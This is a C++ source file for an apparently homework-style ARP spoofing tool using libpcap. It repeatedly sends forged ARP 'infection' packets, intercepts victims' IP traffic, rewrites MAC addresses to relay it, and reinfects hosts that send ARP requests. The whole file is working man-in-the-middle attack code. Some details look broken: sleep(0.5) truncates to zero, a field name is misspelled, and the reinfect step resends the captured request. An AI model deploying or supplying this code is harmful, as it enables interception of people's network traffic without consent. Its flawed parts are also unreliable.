#include "relatedspoof.h"

void Infect(pcap_t *handle, vector<flow> flows)
{
    // periodic trasmission
    while (1)
    {
        for (const auto iter : flows)
        {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&iter.infectionPacket), sizeof(EthArpPacket));
            if (res != 0)
            {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                return;
            }
            cout << "SEND INFECTION PACKET TO " << std::string(iter.sender_ip) << '\n';
            sleep(0.5);
        }
        sleep(10);
    }
}

void Relay(pcap_t *handle, const u_char *spoofed_packet, int size, struct flow f)
{
    // wow..
    EthIpPacket *tmp = (EthIpPacket *)spoofed_packet;
    tmp->eth_.dmac_ = f.target_mac;
    tmp->eth_.smac_ = f.attaceker_mac;
    int res = pcap_sendpacket(handle, spoofed_packet, size);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return;
    }
    cout << "RELAY PACKET FROM " << std::string(f.sender_ip) << "TO " << std::string(f.target_ip) << '\n';
}

void Receive(pcap_t *handle, vector<flow> flows)
{
    struct pcap_pkthdr *header;
    const u_char *spoofed_packet;
    while (1)
    {
        int res = pcap_next_ex(handle, &header, &spoofed_packet);
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return;
        }
        for (const auto iter : flows)
        {
            EthHdr *hdr = (EthHdr *)spoofed_packet;
            // EthIpPacket* ip_packet=(EthIpPacket*)spoofed_packet;
            if (hdr->type() == EthHdr::Ip4)
            {
                EthIpPacket *ip_packet = (EthIpPacket *)spoofed_packet;
                if (ip_packet->eth_.smac() == iter.sender_mac && ip_packet->iph_.sip() == iter.sender_ip)
                {
                    if (ip_packet->iph_.dip() != iter.attacker_ip)
                    {
                        //continue;
                        // Relay the packet
                        Relay(handle, spoofed_packet, header->len, iter);
                    }
                    
                }
            }
            if (hdr->type() == EthHdr::Arp)
            {
                EthArpPacket *arp_packet = (EthArpPacket *)spoofed_packet;
                if (arp_packet->arp_.op() == ArpHdr::Request)
                {
                    if (arp_packet->arp_.tip() == iter.target_ip)
                    {
                        // reinfect
                        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(arp_packet), sizeof(EthArpPacket));
                        if (res != 0)
                        {
                            fprintf(stderr, "Send Arp Failed return %d error=%s\n", res, pcap_geterr(handle));
                        }
                        return;
                    }
                }
            }
        }
    }
}
